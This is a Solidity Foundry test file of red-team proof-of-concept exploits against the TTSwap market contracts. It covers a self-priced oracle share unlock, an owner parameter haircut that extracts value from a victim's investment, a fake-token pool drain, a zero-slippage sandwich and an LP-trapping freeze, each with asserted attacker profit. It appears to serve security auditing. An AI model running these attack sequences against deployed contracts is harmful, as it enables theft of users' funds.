// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "../BaseSetup.t.sol";
import {MyToken} from "../../src/test/MyToken.sol";
import {S_GoodTmpState, S_ProofKey} from "../../src/interfaces/I_TTSwap_Market.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../../src/type/T_GoodKey.sol";
import {L_ProofIdLibrary} from "../../src/libraries/L_Proof.sol";
import {L_GoodConfigLibrary} from "../../src/libraries/L_GoodConfig.sol";
import {TTSwapError} from "../../src/libraries/L_Error.sol";
import {s_share} from "../../src/interfaces/I_TTSwap_Token.sol";
import {TestConfigConstants} from "../TestConfigConstants.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../../src/libraries/L_TTSwapUINT256.sol";

/// @notice Fourth-wave red team: attacker-first, profit-or-bust.
///         Only paths not already nailed as RT-01..19 with a passing profit PoC.
contract RT_FourthWave is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_ProofIdLibrary for S_ProofKey;
    using L_GoodConfigLibrary for uint256;

    uint128 internal constant USDT_INIT_QTY = uint128(50_000 * 10 ** 6);
    uint128 internal constant USDT_INIT_VALUE = uint128(50_000 * 10 ** 12);
    uint128 internal constant BTC_INIT_QTY = uint128(1 * 10 ** 8);
    uint128 internal constant BTC_INIT_VALUE = uint128(63_000 * 10 ** 12);
    uint128 internal constant MIN_INIT_QTY = 500_000;
    uint128 internal constant MIN_INIT_VALUE = 500_000_000_000_000;
    uint128 internal constant MAX_INIT_VALUE = uint128(2 ** 109);
    uint256 internal constant INVEST_THRESHOLD_SHIFT = 154;

    address internal attacker;
    address internal victim;
    uint256 internal usdtGoodId;
    uint256 internal btcGoodId;

    function setUp() public override {
        BaseSetup.setUp();
        attacker = users[4];
        victim = users[5];
        vm.warp(100);
        usdtGoodId = _init(_usdtKey(), marketcreator, USDT_INIT_VALUE, USDT_INIT_QTY);
        btcGoodId = _init(_btcKey(), users[1], BTC_INIT_VALUE, BTC_INIT_QTY);
    }

    function _usdtKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(usdt), id: 0});
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _ttsKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(tts_token), id: 0});
    }

    function _ethKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(eth), id: 0});
    }

    function _init(
        T_GoodKey memory key,
        address owner,
        uint128 value,
        uint128 qty
    ) internal returns (uint256 goodId) {
        vm.startPrank(owner);
        deal(key.contractAddress, owner, 100 * uint256(qty), false);
        MyToken(payable(key.contractAddress)).approve(address(market), type(uint256).max);
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        _snapMarket("market_initGood_RT_FourthWave.t_74");
        goodId = key.toId();
        vm.stopPrank();
    }

    function _proofId(address owner, uint256 goodId) internal pure returns (uint256) {
        return S_ProofKey({owner: owner, currentgood: goodId}).toId();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-20: initGood self-prices the shareMint spot oracle.
    // Anyone can list TTS first at V=2^109 / Q=5e5. Default safeLineUpper=100
    // blocks selling into the pool, so the fake price cannot be arbed down.
    // Cross-contract: Market.initGood → Token.shareMint → Market.ishigher.
    // Capital: 5e5 raw TTS (dust). Profit: full share unlock.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT20_initGood_self_price_unlocks_shareMint() public {
        vm.prank(marketcreator);
        tts_token.setEnv(address(market));
        _snapToken("tts_token_setEnv_RT_FourthWave.t_93");

        // metric = MAX_SHARE_MINT_METRIC (60). RT-14's cap does not save this path:
        // 2^60/2e7 ≈ 5.8e10, while V=2^109 / Q=5e5 ≈ 1.3e27.
        s_share memory share = s_share({
            leftamount: 4_000_000 * 10 ** 12,
            metric: 60,
            chips: 1
        });
        vm.prank(marketcreator);
        tts_token.addShare(share, attacker);
        _snapToken("tts_token_addShare_RT_FourthWave.t_103");

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 68));
        tts_token.shareMint();
        _snapToken("tts_token_shareMint_RT_FourthWave.t_107");

        vm.prank(marketcreator);
        tts_token.mint(attacker, MIN_INIT_QTY);
        _snapToken("tts_token_mint_RT_FourthWave.t_110");

        uint256 ttsBefore = tts_token.balanceOf(attacker);

        vm.startPrank(attacker);
        tts_token.approve(address(market), type(uint256).max);
        _snapToken("tts_token_approve_RT_FourthWave.t_115");
        market.initGood(
            _ttsKey(),
            toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY),
            defaultdata,
            attacker,
            defaultdata
        );
        _snapMarket("market_initGood_RT_FourthWave.t_122");
        tts_token.shareMint();
        _snapToken("tts_token_shareMint_RT_FourthWave.t_123");
        vm.stopPrank();

        uint256 minted = tts_token.balanceOf(attacker) - (ttsBefore - MIN_INIT_QTY);
        emit log_named_uint("RT20 TTS locked in initGood", MIN_INIT_QTY);
        emit log_named_uint("RT20 TTS minted via shareMint", minted);
        emit log_named_uint("RT20 attacker TTS after", tts_token.balanceOf(attacker));

        assertGt(minted, 0, "shareMint unlocked by self-priced TTS good");
        assertEq(tts_token.usershares(attacker).leftamount, 0, "full share unlocked");
        assertGt(tts_token.balanceOf(attacker), ttsBefore, "attacker TTS inventory up");

        // Default safeLine still bricks the arb that would crash the fake price.
        deal(address(tts_token), attacker, MIN_INIT_QTY, false);
        vm.startPrank(attacker);
        tts_token.approve(address(market), type(uint256).max);
        _snapToken("tts_token_approve_RT_FourthWave.t_138");
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        market.buyGood(
            _ttsKey(),
            _usdtKey(),
            toTTSwapUINT256(uint128(1000), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FourthWave.t_149");
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-21: good-owner investThreshold haircuts credited V (up to 30%) without
    // haircutting tokens or shares. Victim invests → price V/Q drops → owner
    // buys the cheap inventory with USDT. No admin role. Needs safeLineUpper>100
    // (production trade switch, see RT-18).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT21_owner_investThreshold_extracts_from_victim_invest() public {
        uint128 ethQty = uint128(100 * 10 ** 18);
        uint128 ethVal = uint128(200_000 * 10 ** 12);
        uint256 ethGoodId = _init(_ethKey(), attacker, ethVal, ethQty);
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(ethGoodId);

        uint128 victimInvest = uint128(50 * 10 ** 18);
        uint128 buyUsdt = uint128(2_000 * 10 ** 6);
        deal(address(eth), victim, victimInvest, false);
        deal(address(usdt), attacker, buyUsdt, false);
        vm.prank(victim);
        eth.approve(address(market), type(uint256).max);
        vm.prank(attacker);
        usdt.approve(address(market), type(uint256).max);

        // Control: same victim size, threshold = 0 (no V haircut).
        uint256 snap = vm.snapshotState();
        uint256 packedInvest = _packInvest(ethGoodId, victimInvest);
        vm.prank(victim);
        market.investGood(
            _ethKey(),
            packedInvest,
            defaultdata,
            defaultdata,
            victim
        );
        _snapMarket("market_investGood_RT_FourthWave.t_186");
        uint256 ethBeforeCtrl = eth.balanceOf(attacker);
        vm.prank(attacker);
        market.buyGood(
            _usdtKey(),
            _ethKey(),
            toTTSwapUINT256(buyUsdt, 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FourthWave.t_198");
        uint256 controlEth = eth.balanceOf(attacker) - ethBeforeCtrl;
        vm.revertToState(snap);

        uint256 patch = uint256(30) << INVEST_THRESHOLD_SHIFT;
        vm.prank(attacker);
        market.modifyGoodByGoodOwner(ethGoodId, patch, attacker, defaultdata);
        _snapMarket("market_modifyGoodByGoodOwner_RT_FourthWave.t_204");

        packedInvest = _packInvest(ethGoodId, victimInvest);
        vm.prank(victim);
        market.investGood(
            _ethKey(),
            packedInvest,
            defaultdata,
            defaultdata,
            victim
        );
        _snapMarket("market_investGood_RT_FourthWave.t_214");

        S_GoodTmpState memory st = market.getGoodState(ethGoodId);
        uint256 priceAfter = (uint256(st.investState.amount1()) * 1e18) /
            uint256(st.currentState.amount1());
        uint256 priceInit = (uint256(ethVal) * 1e18) / uint256(ethQty);
        emit log_named_uint("RT21 price init (1e18 scale)", priceInit);
        emit log_named_uint("RT21 price after threshold invest", priceAfter);

        uint256 ethBefore = eth.balanceOf(attacker);
        uint256 usdtBefore = usdt.balanceOf(attacker);
        vm.prank(attacker);
        market.buyGood(
            _usdtKey(),
            _ethKey(),
            toTTSwapUINT256(buyUsdt, 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FourthWave.t_235");
        uint256 attackEth = eth.balanceOf(attacker) - ethBefore;
        uint256 usdtSpent = usdtBefore - usdt.balanceOf(attacker);

        emit log_named_uint("RT21 control ETH out (no threshold)", controlEth);
        emit log_named_uint("RT21 attack ETH out (threshold 30)", attackEth);
        emit log_named_uint("RT21 extra ETH vs control", attackEth - controlEth);
        emit log_named_uint("RT21 USDT spent (6d)", usdtSpent);

        assertLt(priceAfter, priceInit, "threshold haircut dropped V/Q");
        assertGt(attackEth, controlEth, "same USDT bought more ETH after V haircut");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-22: payGood +1 roundup does NOT kill the fake-good drain. RT-01 only
    // blocked maxInput=0. After production safeLine relax (RT-18), maxInput
    // covering the +1s still swaps dust scam for real USDT.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT22_payGood_roundup_still_drains_with_dust_maxInput() public {
        MyToken fake = new MyToken("FAKE", "FAKE", 6);
        T_GoodKey memory fakeKey = T_GoodKey({
            ercType: 1,
            contractAddress: address(fake),
            id: 0
        });

        vm.startPrank(attacker);
        fake.mint(attacker, 10);
        fake.approve(address(market), type(uint256).max);
        market.initGood(
            fakeKey,
            toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY),
            defaultdata,
            attacker,
            defaultdata
        );
        _snapMarket("market_initGood_RT_FourthWave.t_271");
        vm.stopPrank();

        uint256 fakeGoodId = fakeKey.toId();
        _relaxSafeLine(fakeGoodId);
        _relaxSafeLine(usdtGoodId);

        uint256 usdtPool = usdt.balanceOf(address(market));
        uint128 target = uint128((usdtPool * 3) / 10); // same 30% slice as the 8/07 incident
        uint128 maxIn = 10_000;
        deal(address(fake), attacker, maxIn, false);

        uint256 usdtBefore = usdt.balanceOf(attacker);
        uint256 fakeBefore = fake.balanceOf(attacker);

        vm.startPrank(attacker);
        fake.approve(address(market), type(uint256).max);
        market.payGood(
            fakeKey,
            _usdtKey(),
            toTTSwapUINT256(maxIn, target),
            attacker,
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_payGood_RT_FourthWave.t_297");
        vm.stopPrank();

        uint256 usdtProfit = usdt.balanceOf(attacker) - usdtBefore;
        uint256 fakeSpent = fakeBefore - fake.balanceOf(attacker);
        emit log_named_uint("RT22 USDT received (6d)", usdtProfit);
        emit log_named_uint("RT22 fake wei spent", fakeSpent);
        assertEq(usdtProfit, target, "exact-out filled");
        assertGt(usdtProfit, fakeSpent, "dust fake in, 30% of USDT pool out");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-23: buyGood minOut=0 (explicitly skips TTSwapError(15)). After the
    // production safeLine relax, sandwich a victim swap. Attacker USDT up,
    // victim fills at the pumped price with no slippage bound.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT23_buyGood_zero_minOut_sandwich() public {
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);

        uint128 victimIn = uint128(5_000 * 10 ** 6);
        deal(address(usdt), victim, victimIn, false);
        vm.prank(victim);
        usdt.approve(address(market), type(uint256).max);

        uint256 attackerUsdt = 8_000 * 10 ** 6;
        deal(address(usdt), attacker, attackerUsdt, false);
        vm.prank(attacker);
        usdt.approve(address(market), type(uint256).max);

        uint256 usdtBefore = usdt.balanceOf(attacker);

        vm.startPrank(attacker);
        market.buyGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(uint128(6_000 * 10 ** 6), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FourthWave.t_340");
        vm.stopPrank();

        vm.prank(victim);
        market.buyGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(victimIn, 0), // minOut = 0
            address(0),
            defaultdata,
            victim,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FourthWave.t_353");

        uint256 btcHeld = btc.balanceOf(attacker);
        vm.startPrank(attacker);
        btc.approve(address(market), type(uint256).max);
        market.buyGood(
            _btcKey(),
            _usdtKey(),
            toTTSwapUINT256(uint128(btcHeld), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FourthWave.t_367");
        vm.stopPrank();

        uint256 usdtAfter = usdt.balanceOf(attacker);
        emit log_named_uint("RT23 attacker USDT before", usdtBefore);
        emit log_named_uint("RT23 attacker USDT after", usdtAfter);
        if (usdtAfter > usdtBefore) {
            emit log_named_uint("RT23 USDT profit", usdtAfter - usdtBefore);
        } else {
            emit log_named_int("RT23 USDT pnl", int256(usdtAfter) - int256(usdtBefore));
        }
        assertGt(usdtAfter, usdtBefore, "sandwich extracted USDT from minOut=0 victim");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-24: lockGood is one-way for the good owner (freeze bit is manager-
    // region). Owner-attacker lists a token, takes LP, then freezes forever
    // unless a manager unfreezes. Direct profit = 0; paired with RT-21/23 it
    // is the exit-block after extraction. Here we prove the freeze sticks
    // against the owner's own unfreeze attempt and blocks victim withdraw.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT24_owner_lockGood_traps_victim_lp_no_owner_unlock() public {
        uint128 ethQty = uint128(10 * 10 ** 18);
        uint128 ethVal = uint128(20_000 * 10 ** 12);
        uint256 ethGoodId = _init(_ethKey(), attacker, ethVal, ethQty);

        uint128 victimInvest = uint128(5 * 10 ** 18);
        deal(address(eth), victim, victimInvest, false);
        vm.startPrank(victim);
        eth.approve(address(market), type(uint256).max);
        market.investGood(
            _ethKey(),
            _packInvest(ethGoodId, victimInvest),
            defaultdata,
            defaultdata,
            victim
        );
        _snapMarket("market_investGood_RT_FourthWave.t_404");
        vm.stopPrank();

        vm.prank(attacker);
        market.lockGood(ethGoodId, attacker, defaultdata);
        _snapMarket("market_lockGood_RT_FourthWave.t_408");

        uint256 victimProof = _proofId(victim, ethGoodId);
        uint128 victimShares = market.getProofState(victimProof).shares.amount0();

        vm.startPrank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 10));
        market.disinvestProof(victimProof, victimShares, address(0), victim, defaultdata);
        _snapMarket("market_disinvestProof_RT_FourthWave.t_415");
        vm.stopPrank();

        // Owner cannot clear freeze: freeze lives in the manager mask.
        uint256 unfreezePatch = 0;
        vm.prank(attacker);
        market.modifyGoodByGoodOwner(ethGoodId, unfreezePatch, attacker, defaultdata);
        _snapMarket("market_modifyGoodByGoodOwner_RT_FourthWave.t_421");
        assertTrue(
            market.getGoodState(ethGoodId).goodConfig.isFreeze(),
            "owner write cannot clear freeze"
        );

        emit log_named_uint("RT24 victim ETH locked (wei)", victimInvest);
    }
}
